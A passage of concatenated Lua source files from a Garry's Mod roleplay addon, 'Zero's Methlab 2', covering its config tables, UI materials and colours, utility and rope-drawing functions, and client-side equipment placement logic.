	Draw_Time = true,
}

zmlab2.config.Police = {

	// Should the player gets wanted once he sells meth?
	WantedOnMethSell = false,

	// These jobs can get extra money if they destroy TransportCrates filled with meth and also get a Wanted notification once a player sells meth
	Jobs = {
		//[TEAM_POLICE] = true,
	},

	// The money the police player receives (for destroying the TransportCrate) is the same amount the meth producer receives times this value
	// 1 = 100% , 0.5 = 50%
	PoliceCut = 0.05,

	// This chat command can be used by the police to strip all the meth from the player they are looking at
	cmd_strip = "!stripmeth",
}
-- if TEAM_POLICE then zmlab2.config.Police.Jobs[TEAM_POLICE] = true end


////////////// USING
zmlab2.config.Meth = {
	// How Long does one hit of meth last
	Duration = 10,

	// How much meth gets used up per hit
	Amount = 20,

	// The max duration of a meth trip
	MaxDuration = 100,

	// Is the player allowed to use multiple meth types at the same time? (The player can only be affected by one meth type at a time so using another meth type will overwrite the last one)
	// Setting this to false wont allow the player to use any other meth type till his current high effect has ended
	ConsumMixing = true,
}

////////////// SH ACCESSORY


////////////// LOCKPICKING
zmlab2.config.Lockpick = {

	// Should players be able to lockpick a locked tent door?
	Enabled = true,

	// How Long does it take to lockick a locked tent door?
	Duration = 10,

	// Should the player get wanted for successfully picking a tent doors lock?
	Wanted_enabled = false,
	Wanted_time = 120,
	Wanted_msg = "Picked locks!",
}


////////////// EXTINGUISHER
zmlab2.config.Extinguisher = {
	// How often are the player allowed to use the fire Extinguisher
	Interval = 3,
}

--PATH addons/zeros_methlab2/lua/zmlab2/util/sh_materials.lua:
zmlab2 = zmlab2 or {}
zmlab2.materials = zmlab2.materials or {}

zmlab2.materials["blur"] = Material("pp/blurscreen")
zmlab2.materials["close"] = Material("materials/zerochain/zmlab2/ui/icon_close.png", "noclamp smooth")
zmlab2.materials["highlight"] = Material("zerochain/zmlab2/shader/zmlab2_highlight")
zmlab2.materials["beam01"] = Material("zerochain/zmlab2/cable/zmlab2_beam")
zmlab2.materials["glow01"] = Material("zerochain/zmlab2/sprites/zmlab2_glow01")
zmlab2.materials["radial_shadow"] = Material("materials/zerochain/zmlab2/ui/radial_shadow.png", "noclamp smooth")
zmlab2.materials["linear_gradient"] = Material("materials/zerochain/zmlab2/ui/linear_gradient.png", "smooth")
zmlab2.materials["scanlines"] = Material("materials/zerochain/zmlab2/ui/scanlines.png", "smooth")
zmlab2.materials["item_bg"] = Material("materials/zerochain/zmlab2/ui/item_bg.png", "smooth")
zmlab2.materials["icon_bee"] = Material("materials/zerochain/zmlab2/ui/icon_bee.png", "smooth")
zmlab2.materials["icon_acid"] = Material("materials/zerochain/zmlab2/ui/icon_acid.png", "smooth")
zmlab2.materials["icon_alu"] = Material("materials/zerochain/zmlab2/ui/icon_alu.png", "smooth")
zmlab2.materials["icon_lox"] = Material("materials/zerochain/zmlab2/ui/icon_lox.png", "smooth")
zmlab2.materials["icon_triangle"] = Material("materials/zerochain/zmlab2/ui/icon_triangle.png", "smooth")
zmlab2.materials["icon_cold"] = Material("materials/zerochain/zmlab2/ui/icon_cold.png", "smooth")
zmlab2.materials["icon_hot"] = Material("materials/zerochain/zmlab2/ui/icon_hot.png", "smooth")
zmlab2.materials["icon_box01"] = Material("materials/zerochain/zmlab2/ui/icon_box01.png", "smooth")
zmlab2.materials["icon_loading"] = Material("materials/zerochain/zmlab2/ui/icon_loading.png", "smooth")
zmlab2.materials["icon_error"] = Material("materials/zerochain/zmlab2/ui/icon_error.png", "smooth")
zmlab2.materials["icon_E"] = Material("materials/zerochain/zmlab2/ui/icon_E.png", "smooth")
zmlab2.materials["icon_mouse_left"] = Material("materials/zerochain/zmlab2/ui/icon_mouse_left.png", "smooth")
zmlab2.materials["icon_mouse_right"] = Material("materials/zerochain/zmlab2/ui/icon_mouse_right.png", "smooth")
zmlab2.materials["icon_locked"] = Material("materials/zerochain/zmlab2/ui/icon_locked.png", "smooth")
zmlab2.materials["tank_overlay"] = Material("materials/zerochain/zmlab2/ui/tank_overlay.png", "smooth")
zmlab2.materials["air_pressure_pointer"] = Material("materials/zerochain/zmlab2/ui/air_pressure_pointer.png", "smooth")
zmlab2.materials["liquid_glow_top"] = Material("materials/zerochain/zmlab2/ui/liquid_glow_top.png", "smooth")
zmlab2.materials["circle_thick"] = Material("materials/zerochain/zmlab2/ui/circle_thick.png", "smooth")
zmlab2.materials["icon_sponge"] = Material("materials/zerochain/zmlab2/ui/icon_sponge.png", "smooth")
zmlab2.materials["icon_pipe"] = Material("materials/zerochain/zmlab2/ui/icon_pipe.png", "smooth")
zmlab2.materials["icon_pipe_smoke"] = Material("materials/zerochain/zmlab2/ui/icon_pipe_smoke.png", "smooth")
zmlab2.materials["long_pipe"] = Material("materials/zerochain/zmlab2/ui/long_pipe.png", "smooth")
zmlab2.materials["pipe_connect"] = Material("materials/zerochain/zmlab2/ui/pipe_connect.png", "smooth")
zmlab2.materials["icon_fire_extinguisher"] = Material("materials/zerochain/zmlab2/ui/icon_fire_extinguisher.png", "smooth")
zmlab2.materials["icon_fold"] = Material("materials/zerochain/zmlab2/ui/icon_fold.png", "smooth")
zmlab2.materials["icon_light"] = Material("materials/zerochain/zmlab2/ui/icon_light.png", "smooth")
zmlab2.materials["icon_tray"] = Material("materials/zerochain/zmlab2/ui/icon_tray.png", "smooth")
zmlab2.materials["temp_bg"] = Material("materials/zerochain/zmlab2/ui/temp_bg.png", "smooth")
zmlab2.materials["icon_liquid"] = Material("materials/zerochain/zmlab2/ui/icon_liquid.png", "smooth")
zmlab2.materials["errorgame_overlay"] = Material("materials/zerochain/zmlab2/ui/errorgame_overlay.png", "smooth")
zmlab2.materials["icon_pipe_off"] = Material("materials/zerochain/zmlab2/ui/icon_pipe_off.png", "smooth")
zmlab2.materials["icon_pipe_on"] = Material("materials/zerochain/zmlab2/ui/icon_pipe_on.png", "smooth")
zmlab2.materials["icon_meth"] = Material("materials/zerochain/zmlab2/ui/icon_meth.png", "smooth")
zmlab2.materials["pipe_smoke01"] = Material("materials/zerochain/zmlab2/ui/pipe_smoke01.png", "smooth")
zmlab2.materials["pipe_smoke02"] = Material("materials/zerochain/zmlab2/ui/pipe_smoke02.png", "smooth")
zmlab2.materials["pipe_smoke03"] = Material("materials/zerochain/zmlab2/ui/pipe_smoke03.png", "smooth")
zmlab2.materials["radial_invert_glow"] = Material("materials/zerochain/zmlab2/ui/radial_invert_glow.png", "smooth")
zmlab2.materials["icon_locked_outline"] = Material("materials/zerochain/zmlab2/ui/icon_locked_outline.png", "smooth")
zmlab2.materials["icon_breaking"] = Material("materials/zerochain/zmlab2/ui/breaking.png", "smooth")


zmlab2.colors = zmlab2.colors or {}
zmlab2.colors["black01"] = Color(0, 0, 0, 255)
zmlab2.colors["black02"] = Color(0, 0, 0, 100)
zmlab2.colors["black03"] = Color(0, 0, 0, 200)
zmlab2.colors["black04"] = Color(0, 0, 0, 240)
zmlab2.colors["white02"] = Color(255, 255, 255, 100)
zmlab2.colors["white03"] = Color(255, 255, 255, 15)
zmlab2.colors["green01"] = Color(0, 255, 0, 100)
zmlab2.colors["green02"] = Color(0, 255, 0, 255)
zmlab2.colors["green03"] = Color(71, 209, 53, 255)
zmlab2.colors["blue01"] = Color(0, 125, 255, 100)
zmlab2.colors["blue02"] = Color(0, 125, 255, 255)
zmlab2.colors["grey01"] = Color(75, 75, 75, 255)
zmlab2.colors["grey02"] = Color(175, 175, 175, 255)
zmlab2.colors["acid"] = Color(150, 190, 71, 255)
zmlab2.colors["orange01"] = Color(255, 125, 0, 255)
zmlab2.colors["red01"] = Color(209, 53, 53, 100)
zmlab2.colors["red02"] = Color(209, 53, 53, 255)
zmlab2.colors["red03"] = Color(255, 0, 0, 255)
zmlab2.colors["mixer_liquid01"] = Color(255, 230, 111, 255)
zmlab2.colors["mixer_liquid02"] = Color(186, 255, 111, 255)
zmlab2.colors["mixer_liquid05"] = Color(187, 230, 210, 255)

zmlab2.colors["textentry"] = Color(149, 152, 154)

--PATH addons/zeros_methlab2/lua/zmlab2/util/sh_util.lua:
zmlab2 = zmlab2 or {}
zmlab2.util = zmlab2.util or {}



////////////////////////////////////////////
//////////////// DEFAULT ///////////////////
////////////////////////////////////////////
function zmlab2.Print(msg)
	print("[Zero´s Methlab 2] " .. msg)
end

if SERVER then

	// Basic notify function
	function zmlab2.Notify(ply, msg, ntfType)
		if not IsValid(ply) then return end

		if DarkRP and DarkRP.notify then
			DarkRP.notify(ply, ntfType, 8, msg)
		else
			ply:ChatPrint(msg)
		end
	end
else
	function zmlab2.util.LoopedSound(ent, soundfile, shouldplay)
		if shouldplay and zmlab2.util.InDistance(LocalPlayer():GetPos(), ent:GetPos(), 500) then
			if ent.Sounds == nil then
				ent.Sounds = {}
			end

			if ent.Sounds[soundfile] == nil then
				ent.Sounds[soundfile] = CreateSound(ent, soundfile)
			end

			if ent.Sounds[soundfile]:IsPlaying() == false then
				ent.Sounds[soundfile]:Play()
				ent.Sounds[soundfile]:ChangeVolume(zmlab2.Convar.Get("zmlab2_cl_sfx_volume"), 0)
				ent.LastVolume = zmlab2.Convar.Get("zmlab2_cl_sfx_volume")
			else
				if ent.LastVolume ~= zmlab2.Convar.Get("zmlab2_cl_sfx_volume") then
					ent.LastVolume = zmlab2.Convar.Get("zmlab2_cl_sfx_volume")
					ent.Sounds[soundfile]:ChangeVolume(ent.LastVolume, 0)
				end
			end
		else
			if ent.Sounds == nil then
				ent.Sounds = {}
			end

			if ent.Sounds[soundfile] ~= nil and ent.Sounds[soundfile]:IsPlaying() == true then
				ent.Sounds[soundfile]:ChangeVolume(0, 0)
				ent.Sounds[soundfile]:Stop()
				ent.Sounds[soundfile] = nil
			end
		end
	end

	function zmlab2.util.GetTextSize(txt,font)
		surface.SetFont(font)
		return surface.GetTextSize(txt)
	end

	function zmlab2.util.DrawOutlinedBox(x, y, w, h, thickness, clr)
		surface.SetDrawColor(clr)

		for i = 0, thickness - 1 do
			surface.DrawOutlinedRect(x + i, y + i, w - i * 2, h - i * 2)
		end
	end

	function zmlab2.util.DrawBlur(p, a, d)
		local x, y = p:LocalToScreen(0, 0)
		surface.SetDrawColor(color_white)
		surface.SetMaterial(zmlab2.materials["blur"])

		for i = 1, d do
			zmlab2.materials["blur"]:SetFloat("$blur", (i / d) * a)
			zmlab2.materials["blur"]:Recompute()
			render.UpdateScreenEffectTexture()
			surface.DrawTexturedRect(x * -1, y * -1, ScrW(), ScrH())
		end
	end

	function zmlab2.util.ColorToVector(col)
		return Vector((1 / 255) * col.r, (1 / 255) * col.g, (1 / 255) * col.b)
	end

	function zmlab2.util.ScreenPointToRay(ViewPos,filter,mask)
		local x, y = input.GetCursorPos()
		local dir = gui.ScreenToVector( x,y )

		// Trace for valid Spawn Pos
		local c_trace = zmlab2.util.TraceLine({
			start = ViewPos,
			endpos = ViewPos + dir:Angle():Forward() * 10000,
			filter = filter,
			mask = mask,
		}, "ScreenPointToRay")
		return c_trace
	end

	function zmlab2.util.DrawCircle( x, y, radius, seg )
		local cir = {}

		table.insert( cir, { x = x, y = y, u = 0.5, v = 0.5 } )
		for i = 0, seg do
			local a = math.rad( ( i / seg ) * -360 )
			table.insert( cir, { x = x + math.sin( a ) * radius, y = y + math.cos( a ) * radius, u = math.sin( a ) / 2 + 0.5, v = math.cos( a ) / 2 + 0.5 } )
		end

		local a = math.rad( 0 )
		table.insert( cir, { x = x + math.sin( a ) * radius, y = y + math.cos( a ) * radius, u = math.sin( a ) / 2 + 0.5, v = math.cos( a ) / 2 + 0.5 } )

		surface.DrawPoly( cir )
	end
end

function zmlab2.util.FormatDate(date)
	local chars = string.Split( date, "/" )
	local CleanDate = chars[3] .. "/" .. chars[2] .. "/" .. chars[1] .. " - " .. chars[4]

	return CleanDate
end

function zmlab2.util.GetDate()
	return os.time()
end

function zmlab2.util.GenerateUniqueID(template)
    return string.gsub(template, "[xy]", function(c)
        local v = (c == "x") and math.random(0, 0xf) or math.random(8, 0xb)

        return tostring(string.format("%x", v))
    end)
end

function zmlab2.util.UnitToMeter(unit)
	return math.Round(unit * 0.01953125) .. "m"
end

// Takes in a savefile name and makes it clean and nice
function zmlab2.util.FormatSavefile(id)
	// Make it lower case
	id = string.lower(id)

	// Lets removed any problematic symbols
	local pattern = '[\\/:%*%?"<>!|]' // a set of all restricted characters
	id = string.gsub(id,pattern,"",99)

	// Replace empty space with underline
	id = string.Replace(id," ","_")

	return id
end

function zmlab2.util.FormatTime(time)
	local divid = time / 60
	local minutes = math.floor(time / 60)
	local seconds = math.Round(60 * (divid - minutes))

	local lang_m = zmlab2.language["Minutes"]
	local lang_s = zmlab2.language["Seconds"]

	//string.FormattedTime( 90, "%02i:%02i:%02i" )

	if seconds > 0 and minutes > 0 then
		return minutes .. " " .. lang_m .. " | " .. seconds .. " " .. lang_s
	elseif seconds <= 0 and minutes > 0 then
		return minutes .. " " .. lang_m
	elseif seconds >= 0 and minutes <= 0 then
		return seconds .. " " .. lang_s
	end
end

function zmlab2.util.LerpColor(t, c1, c2)
	local c3 = Color(0, 0, 0)
	c3.r = Lerp(t, c1.r, c2.r)
	c3.g = Lerp(t, c1.g, c2.g)
	c3.b = Lerp(t, c1.b, c2.b)
	c3.a = Lerp(t, c1.a, c2.a)

	return c3
end

// Checks if the distance between pos01 and pos02 is smaller then dist
function zmlab2.util.InDistance(pos01, pos02, dist)
	return  pos01:DistToSqr(pos02) < (dist * dist)
end

//Used to fix the Duplication Glitch
function zmlab2.util.CollisionCooldown(ent)
	if ent.zmlab2_CollisionCooldown == nil then
		ent.zmlab2_CollisionCooldown = CurTime() + 0.1

		return false
	else
		if CurTime() < ent.zmlab2_CollisionCooldown then
			return true
		else
			ent.zmlab2_CollisionCooldown = CurTime() + 0.1

			return false
		end
	end
end

function zmlab2.util.SnapValue(snapval,val)
	val = val / snapval
	val = math.Round(val)
	val = val * snapval
	return val
end

// Tells us if the functions is valid
function zmlab2.util.FunctionValidater(func)
	if (type(func) == "function") then return true end
	// 949137607
	return false
end

// Creates a new randomized table from the input table
function zmlab2.util.table_randomize( t )
	local out = { }

	while #t > 0 do
		table.insert( out, table.remove( t, math.random( #t ) ) )
	end

	return out
end

function zmlab2.util.RankTblToString(tbl)
	local str = ""

	for k, v in pairs(tbl) do
		str = str .. k .. ", "
	end

	return str
end

// Performs a TraceLine
function zmlab2.util.TraceLine(tracedata,identifier)
	return util.TraceLine(tracedata)
end

// Calculates how much of the AddAmount will remain and how much can be added
function zmlab2.util.GetRemain(HaveAmount, CapAmount, AddAmount)
	local diff = CapAmount - HaveAmount
	local add = math.Clamp(AddAmount, 0, diff)
	local remain = AddAmount - add
	return remain, add
end

// Thank you Stromic for that function :)
function zmlab2.util.sortAlphabeticallyByKeyValues(tbl, ascending)
	local normaltable = {}
	local cleantable = {}

	for k, v in pairs(tbl) do
		table.insert(normaltable, k)
	end

	if ascending then
		table.sort(normaltable, function(a, b)
			a, b = differenciate(a, b)

			return a < b
		end)
	else
		table.sort(normaltable, function(a, b)
			a, b = differenciate(a, b)

			return a > b
		end)
	end

	for k, v in pairs(normaltable) do
		cleantable[v] = k
	end

	return cleantable
end
////////////////////////////////////////////
////////////////////////////////////////////

--PATH addons/zeros_methlab2/lua/zmlab2/util/cl_rope.lua:
if SERVER then return end
zmlab2 = zmlab2 or {}
zmlab2.Rope = zmlab2.Rope or {}

function zmlab2.Rope.Setup(Length, v_start, v_end)
	local RopePoints = {}

	if v_end then
		for point = 1, Length do
			RopePoints[point] = {
				position = LerpVector((1 / Length) * point, v_start, v_end),
				velocity = vector_origin
			}
		end
	else
		for point = 1, Length do
			RopePoints[point] = {
				position = v_start,
				velocity = vector_origin
			}
		end
	end

	return RopePoints
end

function zmlab2.Rope.Update(RopePoints, v_start, v_end, length, gravity, damping)
	// Updates the Rope points to move physicly

	local dist = v_end:DistToSqr(v_start)
	dist = (dist / length) * 0.1


	for point = 1, length do
		local position1 = RopePoints[math.Clamp(point - 1, 1, length)].position - RopePoints[point].position
		local length1 = math.max(position1:Length(), dist)

		local position2 = RopePoints[math.Clamp(point + 1, 1, length)].position - RopePoints[point].position
		local length2 = math.max(position2:Length(), dist)

		local velocity = (position1 / length1) + (position2 / length2) + (gravity * 0.001)

		RopePoints[point].velocity = (RopePoints[point].velocity * damping) + velocity * (dist * 0.01)

		RopePoints[point].position = RopePoints[point].position + RopePoints[point].velocity
	end

	RopePoints[1].position = v_start
	RopePoints[length].position = v_end
end

function zmlab2.Rope.Draw(RopePoints, v_start, v_end, length, LineMaterial, MatSprite, color)

	local dist = v_end:DistToSqr(v_start)
	dist = (dist / length) * 0.1

	cam.Start3D()
		render.SetMaterial(LineMaterial)
		render.StartBeam(length)
			local tex_repeat = math.floor(dist / 50)
			tex_repeat = math.Clamp(tex_repeat, 10, 50)

			for point = 1, length do
				if RopePoints[point] then
					local tex = (tex_repeat / length) * point
					render.AddBeam(RopePoints[point].position, 10, tex, color)
				end
			end
		render.EndBeam()

		if MatSprite then
			render.SetMaterial(MatSprite)
			render.DrawSprite(RopePoints[length].position, 15, 15, color)
		end

	cam.End3D()
end

--PATH addons/zeros_methlab2/lua/zmlab2/equipment/cl_equipment.lua:
if not CLIENT then return end
zmlab2 = zmlab2 or {}
zmlab2.Equipment = zmlab2.Equipment or {}

function zmlab2.Equipment.Initialize(Equipment) end
function zmlab2.Equipment.OnRemove(Equipment) end

function zmlab2.Equipment.DrawButton(Equipment,txt,y,IsHovered)

    local font = zmlab2.GetFont("zmlab2_font02")
    local txtSize = zmlab2.util.GetTextSize(txt,font)
    if txtSize > 220 then font = zmlab2.GetFont("zmlab2_font04") end


    draw.RoundedBox(0, -110, y-30, 220, 60, zmlab2.colors["black02"])

    if IsHovered then
        zmlab2.util.DrawOutlinedBox(-110, y-30, 220, 60, 4, zmlab2.colors["blue02"])
    else
        zmlab2.util.DrawOutlinedBox( -110, y-30, 220, 60, 4, color_white)
    end

    draw.SimpleText(txt,font,0,y,color_white,TEXT_ALIGN_CENTER,TEXT_ALIGN_CENTER)
end

function zmlab2.Equipment.DrawUI(Equipment)

    if zmlab2.util.InDistance(Equipment:GetPos(), LocalPlayer():GetPos(), 350) and zmlab2.Convar.Get("zmlab2_cl_drawui") == 1 then
        cam.Start3D2D(Equipment:LocalToWorld(Vector(0,13.5,40)), Equipment:LocalToWorldAngles(Angle(0,180,90)), 0.1)
            if zmlab2.config.Equipment.RepairOnly == false then
                zmlab2.Equipment.DrawButton(Equipment,zmlab2.language["Equipment_Build"],-70,Equipment:OnBuild(LocalPlayer()))
                zmlab2.Equipment.DrawButton(Equipment,zmlab2.language["Equipment_Move"],0,Equipment:OnMove(LocalPlayer()))
                zmlab2.Equipment.DrawButton(Equipment,zmlab2.language["Equipment_Remove"],140,Equipment:OnRemoveButton(LocalPlayer()))
            end
            zmlab2.Equipment.DrawButton(Equipment,zmlab2.language["Equipment_Repair"],70,Equipment:OnRepair(LocalPlayer()))
        cam.End3D2D()
    end
end

// Takes in the HitEntity of the trace and returns the Tent entity and a valid and free build attachment point
local function GetPlacementPos(HitEntity)
    local Tent,AttachID
    if IsValid(HitEntity) and HitEntity:GetClass() == "zmlab2_tent" then

        Tent = HitEntity

        local EquipmentData = zmlab2.config.Equipment.List[zmlab2.PointerSystem.Data.EquipmentID]

        for k,v in pairs(Tent:GetAttachments()) do

            //debugoverlay.Sphere(Tent:GetAttachment(v.id).Pos,5, 0.1, Color( 255, 255, 255 ), false )

            // If the attachment point not for building, not a nowall build attach and not set to some class then stop
            local attach_name = v.name
            if (string.sub(attach_name,1,6) ~= "build_" and string.sub(attach_name,1,6) ~= "nowall") and string.sub(attach_name,1,#EquipmentData.class) ~= EquipmentData.class then continue end

            if EquipmentData.class == "zmlab2_machine_ventilation" and string.sub(attach_name,1,6) == "nowall" then continue end

            local attach = Tent:GetAttachment(v.id)
            if attach == nil then continue end

            local pos = attach.Pos

            local InDistance = pos:DistToSqr(zmlab2.PointerSystem.Data.Pos) < (25 * 25)

            if InDistance == false then
                continue
            end

            if zmlab2.Equipment.AreaOccupied(pos) == false then
                AttachID = v.id
                zmlab2.PointerSystem.Data.Pos = pos
                zmlab2.PointerSystem.Data.Ang = attach.Ang
                break
            end
        end
    end
    return Tent,AttachID
end

local function CanPlace(Tent,AttachID)
    if zmlab2.config.Equipment.RestrictToTent == true then
        if not IsValid(Tent) or AttachID == nil then
            return false
        end
    else
        if zmlab2.PointerSystem.Data.Pos == nil or zmlab2.PointerSystem.Data.Ang == nil then
            return false
        end
    end

    if zmlab2.Equipment.AreaOccupied(zmlab2.PointerSystem.Data.Pos,zmlab2.PointerSystem.Data.Target) then
        return false
    end

    if not IsValid(Tent) and zmlab2.PointerSystem.Data.Pos and zmlab2.config.Equipment.RestrictToTent == false then
        zmlab2.PointerSystem.Data.Ang = (LocalPlayer():GetPos() - zmlab2.PointerSystem.Data.Pos):Angle()
        zmlab2.PointerSystem.Data.Ang:RotateAroundAxis(zmlab2.PointerSystem.Data.Ang:Up(),-90)
    end

    local aUp = zmlab2.PointerSystem.Data.Ang:Up()
    if not IsValid(zmlab2.PointerSystem.Data.HitEntity) then
        if (math.abs(aUp.x) > 0.2 or math.abs(aUp.y) > 0.2 or aUp.z < 0.7) then return false end
    else
        if zmlab2.PointerSystem.Data.HitEntity:GetClass() ~= "zmlab2_tent" then
            if (math.abs(aUp.x) > 0.2 or math.abs(aUp.y) > 0.2 or aUp.z < 0.7) then return false end
        end
    end


    return true
end

function zmlab2.Equipment.Place(Equipment,EquipmentID)
    zmlab2.Debug("zmlab2.Equipment.Place")

    zmlab2.PointerSystem.Start(Equipment,function()

        // OnInit
        zmlab2.PointerSystem.Data.MainColor = zmlab2.colors["green01"]

        zmlab2.PointerSystem.Data.ActionName = zmlab2.language["Construct"]

        zmlab2.PointerSystem.Data.EquipmentID = EquipmentID

        // Overwride model if we got a EquipmentID
        local EquipmentData = zmlab2.config.Equipment.List[EquipmentID]
        zmlab2.PointerSystem.Data.ModelOverwrite = EquipmentData.model
    end,function()

        // OnLeftClick
        if not zmlab2.PointerSystem.Data.Target then return end

        // Can we build here?
        if CanPlace(zmlab2.PointerSystem.Data.Target.Tent,zmlab2.PointerSystem.Data.Target.AttachID) == false then return end

        //if not IsValid(zmlab2.PointerSystem.Data.Target.Tent) then return end
        //if zmlab2.PointerSystem.Data.Target.AttachID == nil then return end

        // Position detection done, send info to server and wait for further instructions
        net.Start("zmlab2_Equipment_Place")
        net.WriteEntity(zmlab2.PointerSystem.Data.From)
        net.WriteEntity(zmlab2.PointerSystem.Data.Target.Tent)
        net.WriteInt(zmlab2.PointerSystem.Data.Target.AttachID or -1,16)
        net.WriteVector(zmlab2.PointerSystem.Data.Pos)
        net.WriteAngle(zmlab2.PointerSystem.Data.Ang)
        net.WriteUInt(zmlab2.PointerSystem.Data.EquipmentID,16)
        net.SendToServer()

        zmlab2.PointerSystem.Stop()

        // Reopens the interface after we finished, if we wanna build something again
        zmlab2.Equipment.OpenInterface()
    end,function()

        // MainLogic

        // Catch the Target Data
        // Lets search for the closest tent and AttachID
        local Tent , AttachID = GetPlacementPos(zmlab2.PointerSystem.Data.HitEntity)
        zmlab2.PointerSystem.Data.Target = {
            Tent = Tent,
            AttachID = AttachID,
        }

        // Change the main color depening if we found a valid building pos
        if CanPlace(Tent,AttachID) then
            zmlab2.PointerSystem.Data.MainColor = zmlab2.colors["green01"]
        else
            zmlab2.PointerSystem.Data.MainColor = zmlab2.colors["red01"]
        end

        // Update PreviewModel
        if IsValid(zmlab2.PointerSystem.Data.PreviewModel) then
            zmlab2.PointerSystem.Data.PreviewModel:SetModel(zmlab2.PointerSystem.Data.ModelOverwrite)
            zmlab2.PointerSystem.Data.PreviewModel:SetPos(zmlab2.PointerSystem.Data.Pos)
            zmlab2.PointerSystem.Data.PreviewModel:SetAngles(zmlab2.PointerSystem.Data.Ang)
            zmlab2.PointerSystem.Data.PreviewModel:SetColor(zmlab2.PointerSystem.Data.MainColor)
        end
    end)
end

net.Receive("zmlab2_Equipment_Deconstruct", function(len,ply)
    zmlab2.Debug_Net("zmlab2_Equipment_Deconstruct",len)
    local Equipment = net.ReadEntity()
    if not IsValid(Equipment) then return end
    zmlab2.Equipment.Deconstruct(Equipment)
end)
function zmlab2.Equipment.Deconstruct(Equipment)
    zmlab2.PointerSystem.Start(Equipment,function()

        // OnInit
        zmlab2.PointerSystem.Data.MainColor = zmlab2.colors["red01"]

        zmlab2.PointerSystem.Data.ActionName = zmlab2.language["Deconstruct"]

    end,function()

        // OnLeftClick

        if not zmlab2.PointerSystem.Data.Target then return end

        net.Start("zmlab2_Equipment_Deconstruct")
        net.WriteEntity(zmlab2.PointerSystem.Data.Target)
        net.SendToServer()
    end,function()

        // MainLogic

        // Catch the Target Data
        if IsValid(zmlab2.PointerSystem.Data.HitEntity) and zmlab2.Equipment_Classes[zmlab2.PointerSystem.Data.HitEntity:GetClass()] then
            zmlab2.PointerSystem.Data.Target = zmlab2.PointerSystem.Data.HitEntity
        else
            zmlab2.PointerSystem.Data.Target = nil
        end

        // Update PreviewModel
        if IsValid(zmlab2.PointerSystem.Data.PreviewModel) then
            if IsValid(zmlab2.PointerSystem.Data.Target) then
                zmlab2.PointerSystem.Data.PreviewModel:SetModel(zmlab2.PointerSystem.Data.Target:GetModel())
                zmlab2.PointerSystem.Data.PreviewModel:SetPos(zmlab2.PointerSystem.Data.Target:GetPos())
                zmlab2.PointerSystem.Data.PreviewModel:SetAngles(zmlab2.PointerSystem.Data.Target:GetAngles())
            else
                zmlab2.PointerSystem.Data.PreviewModel:SetModel("models/hunter/misc/sphere025x025.mdl")
                zmlab2.PointerSystem.Data.PreviewModel:SetPos(zmlab2.PointerSystem.Data.Pos)
                zmlab2.PointerSystem.Data.PreviewModel:SetAngles(zmlab2.PointerSystem.Data.Ang)
            end
            zmlab2.PointerSystem.Data.PreviewModel:SetColor(zmlab2.PointerSystem.Data.MainColor)
        end
    end)
end

net.Receive("zmlab2_Equipment_Move", function(len,ply)
    zmlab2.Debug_Net("zmlab2_Equipment_Move", len)
    local Equipment = net.ReadEntity()
    if not IsValid(Equipment) then return end
    zmlab2.Equipment.Move(Equipment)
end)
function zmlab2.Equipment.Move(Equipment)
    zmlab2.PointerSystem.Start(Equipment,function()

        // OnInit
        zmlab2.PointerSystem.Data.MainColor = zmlab2.colors["blue01"]
    end,function()

        // OnLeftClick

        if IsValid(zmlab2.PointerSystem.Data.Target) then

            // Lets search for the closest tent and AttachID
            local Tent , AttachID = GetPlacementPos(zmlab2.PointerSystem.Data.HitEntity)

            // Can we build here?
            if CanPlace(Tent,AttachID) == false then return end

            net.Start("zmlab2_Equipment_Move")
            net.WriteEntity(zmlab2.PointerSystem.Data.Target)
            net.WriteEntity(Tent)
            net.WriteInt(AttachID or -1,16)
            net.WriteVector(zmlab2.PointerSystem.Data.Pos)
            net.WriteAngle(zmlab2.PointerSystem.Data.Ang)
            net.SendToServer()

            zmlab2.PointerSystem.Data.Target = nil
        else

            // Select the machine to move
            if not IsValid(zmlab2.PointerSystem.Data.HitEntity) then return end
            if zmlab2.Equipment_Classes[zmlab2.PointerSystem.Data.HitEntity:GetClass()] == nil then return end

            zmlab2.PointerSystem.Data.Target = zmlab2.PointerSystem.Data.HitEntity

            zmlab2.PointerSystem.Data.EquipmentID = zmlab2.Equipment_Classes[zmlab2.PointerSystem.Data.Target:GetClass()]

            zmlab2.Sound.EmitFromEntity("tray_drop", zmlab2.PointerSystem.Data.HitEntity)
        end
    end,function()

        // MainLogic

        // Update PreviewModel
        if IsValid(zmlab2.PointerSystem.Data.PreviewModel) then

            zmlab2.PointerSystem.Data.Ignore = zmlab2.PointerSystem.Data.Target

            if IsValid(zmlab2.PointerSystem.Data.Target) then
                zmlab2.PointerSystem.Data.PreviewModel:SetModel(zmlab2.PointerSystem.Data.Target:GetModel())

                // We just call this function so it sets the Pos/Ang of the preview model
                local Tent,AttachID = GetPlacementPos(zmlab2.PointerSystem.Data.HitEntity)

                // Change the main color depening if we found a valid building pos
                if CanPlace(Tent,AttachID) then
                    zmlab2.PointerSystem.Data.MainColor = zmlab2.colors["blue01"]
                else
                    zmlab2.PointerSystem.Data.MainColor = zmlab2.colors["red01"]
                end

                zmlab2.PointerSystem.Data.ActionName = zmlab2.language["Choosepostion"]
            else
                zmlab2.PointerSystem.Data.MainColor = zmlab2.colors["blue01"]
                zmlab2.PointerSystem.Data.ActionName = zmlab2.language["ChooseMachine"]

                // If we found a entity that we can move then get its pos and ang
                if IsValid(zmlab2.PointerSystem.Data.HitEntity) and zmlab2.Equipment_Classes[zmlab2.PointerSystem.Data.HitEntity:GetClass()] then
                    zmlab2.PointerSystem.Data.Pos = zmlab2.PointerSystem.Data.HitEntity:GetPos()
                    zmlab2.PointerSystem.Data.Ang = zmlab2.PointerSystem.Data.HitEntity:GetAngles()
                    zmlab2.PointerSystem.Data.PreviewModel:SetModel(zmlab2.PointerSystem.Data.HitEntity:GetModel())
                else
                    zmlab2.PointerSystem.Data.PreviewModel:SetModel("models/hunter/misc/sphere025x025.mdl")
                end
            end

            zmlab2.PointerSystem.Data.PreviewModel:SetPos(zmlab2.PointerSystem.Data.Pos)
            zmlab2.PointerSystem.Data.PreviewModel:SetAngles(zmlab2.PointerSystem.Data.Ang)
            zmlab2.PointerSystem.Data.PreviewModel:SetColor(zmlab2.PointerSystem.Data.MainColor)
        end
    end)
end

net.Receive("zmlab2_Equipment_Repair", function(len,ply)
    zmlab2.Debug_Net("zmlab2_Equipment_Repair", len)
    local Equipment = net.ReadEntity()
    if not IsValid(Equipment) then return end
    zmlab2.Equipment.Repair(Equipment)
end)
function zmlab2.Equipment.Repair(Equipment)
    zmlab2.PointerSystem.Start(Equipment,function()

        // OnInit
        zmlab2.PointerSystem.Data.MainColor = zmlab2.colors["green01"]

